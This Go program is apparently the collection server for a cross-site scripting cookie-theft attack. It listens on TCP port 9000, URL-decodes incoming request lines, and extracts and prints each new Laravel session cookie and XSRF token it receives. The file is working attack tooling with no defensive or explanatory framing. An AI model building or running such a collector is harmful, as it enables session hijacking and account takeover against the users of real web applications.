package main

import (
	"fmt"
	"log"
	"net/url"
	"regexp"
	"net"
	"bufio"
	"sync"
)

const port = ":9000"
const tConn = "tcp"

var (
	seenCookies sync.Map
)

func filter(decoded string) {
	laravel := regexp.MustCompile(`laravel_starter_session=([a-zA-Z0-9%]+)`)
	xsrf := regexp.MustCompile(`XSRF-TOKEN=([a-zA-Z0-9%]+)`)

	laravelMatches := laravel.FindStringSubmatch(decoded)
	if laravelMatches != nil {
		value := laravelMatches[1]
		key := "laravel:" + value
		if _, loaded := seenCookies.LoadOrStore(key, struct{}{}); !loaded {
			fmt.Println("Laravel_starter_session: ", value + "\n\n")
		}
	}

	xsrfMatches := xsrf.FindStringSubmatch(decoded)
	if xsrfMatches != nil {
		value := xsrfMatches[1]
		key := "xsrf:" + value
		if _, loaded := seenCookies.LoadOrStore(key, struct{}{}); !loaded {
			fmt.Println("XSRF-TOKEN: ", value + "\n\n")
		}
	}
}


func decode(urlEncode string) string {
	urlEncode = regexp.MustCompile(`%u[0-9A-Fa-f]{4}`).ReplaceAllString(urlEncode, "")
	decoded, err := url.QueryUnescape(urlEncode)
	if err != nil {
		log.Fatal(err)
	}
	return decoded
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)

	requestLine, err := reader.ReadString('\n')
	if err != nil {
		log.Println("\n[!] Error reading the request: ", err)
		return
	}

	decoded := decode(requestLine)
	filter(decoded)
}

func main() {
	listener, err := net.Listen(tConn, port)
	if err != nil {
		log.Fatal("\n[!] Error at starting server: ", err)
	}
	defer listener.Close()

	fmt.Println("\n[+] Listening on port ", port, "\n\n")
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Println("\n[!] Error with the connection: ", err)
			continue
		}

		go handleConnection(conn)
	}
}
